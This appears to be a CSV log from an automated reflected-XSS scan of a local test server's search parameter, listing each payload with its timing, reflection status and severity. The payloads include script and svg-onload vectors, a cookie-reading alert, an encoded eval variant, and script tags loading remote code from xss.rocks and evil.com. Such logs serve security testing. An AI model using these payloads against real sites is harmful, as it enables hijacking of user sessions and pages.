Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:25:59.564,2026-01-10 14:25:59.840,0.275,http://localhost:3000/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:25:59.840,2026-01-10 14:25:59.862,0.022,http://localhost:3000/search,GET,q,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:25:59.862,2026-01-10 14:26:00.073,0.210,http://localhost:3000/search,GET,q,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:00.073,2026-01-10 14:26:00.075,0.002,http://localhost:3000/search,GET,q,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:00.075,2026-01-10 14:26:00.090,0.016,http://localhost:3000/search,GET,q,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:00.090,2026-01-10 14:26:00.093,0.003,http://localhost:3000/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:00.093,2026-01-10 14:26:00.110,0.016,http://localhost:3000/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:00.110,2026-01-10 14:26:00.112,0.003,http://localhost:3000/search,GET,q,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:00.112,2026-01-10 14:26:00.671,0.559,http://localhost:3000/search,GET,q,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 14:26:00.671,2026-01-10 14:26:02.335,1.664,http://localhost:3000/search,GET,q,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 14:26:02.335,2026-01-10 14:26:02.353,0.018,http://localhost:3000/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.353,2026-01-10 14:26:02.355,0.003,http://localhost:3000/search,GET,q,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.355,2026-01-10 14:26:02.372,0.017,http://localhost:3000/search,GET,q,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.372,2026-01-10 14:26:02.375,0.003,http://localhost:3000/search,GET,q,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.375,2026-01-10 14:26:02.398,0.023,http://localhost:3000/search,GET,q,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.398,2026-01-10 14:26:02.400,0.002,http://localhost:3000/search,GET,q,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.400,2026-01-10 14:26:02.421,0.020,http://localhost:3000/search,GET,q,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.421,2026-01-10 14:26:02.423,0.003,http://localhost:3000/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.423,2026-01-10 14:26:02.442,0.019,http://localhost:3000/search,GET,q,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
